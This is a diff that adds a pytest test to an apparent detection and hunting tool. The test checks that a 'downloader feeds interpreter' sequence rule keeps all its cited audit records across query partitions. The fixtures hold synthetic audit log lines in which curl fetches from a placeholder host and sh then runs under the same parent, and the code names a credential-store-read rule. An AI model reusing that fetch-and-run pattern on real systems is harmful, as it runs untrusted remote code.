@@ -181,3 +181,31 @@ def test_audit_errors_make_only_process_rules_partial(monkeypatch):
     assert cells["host.credential_store_read"] == "evaluated_partial"        # process_exec rule
     assert cells["net.suricata_alert_stack"] == "not_applicable_no_events"   # unaffected family
     assert s.partial_reasons                                                  # hunt still records it
+
+
+def test_sequence_pair_split_across_partitions_keeps_all_raw_copies(monkeypatch):
+    # N3 (gate re-review): downloader in partition 1, interpreter in partition 2, same parent
+    def rec(rid, raw, ts):
+        return {"_id": rid, "_index": "romulus-host-x", "_source": {
+            "@timestamp": ts, "message": raw, "host": {"name": "video"},
+            "event": {"dataset": "linux.audit", "original": raw}}}
+    p1 = [rec("d1", 'type=EXECVE msg=audit(1731938698.000:7001): argc=2 a0="curl" a1="http://192.0.2.7/x"',
+              "2024-11-18T14:04:58Z"),
+          rec("d2", 'type=SYSCALL msg=audit(1731938698.000:7001): syscall=59 success=yes ppid=500 pid=501 '
+                    'comm="curl" exe="/usr/bin/curl"', "2024-11-18T14:04:58Z")]
+    p2 = [rec("s1", 'type=EXECVE msg=audit(1731938701.000:7002): argc=1 a0="sh"', "2024-11-18T14:05:01Z"),
+          rec("s2", 'type=SYSCALL msg=audit(1731938701.000:7002): syscall=59 success=yes ppid=500 pid=502 '
+                    'comm="sh" exe="/usr/bin/dash"', "2024-11-18T14:05:01Z")]
+    batches = iter([p1, p2])
+    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, next(batches)))
+    repo = _repo()
+    s = sw.Sweep(repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=10)), {"x": None})
+    s.run_partition("romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=2)
+    s.run_partition("romulus-host-x", None, [], Window(start=START + timedelta(minutes=5),
+                                                        end=START + timedelta(minutes=10)), est=2)
+    s.finalize()
+    from romulus.report import manifest as rm
+    seq = [c for c in repo.candidates("h1") if c["rule_id"] == "host.downloader_feeds_interpreter"]
+    assert len(seq) == 1
+    cites = rm._citations(repo, seq[0])
+    assert len(cites) == 4 and all(c["status"] == "retained" for c in cites), cites
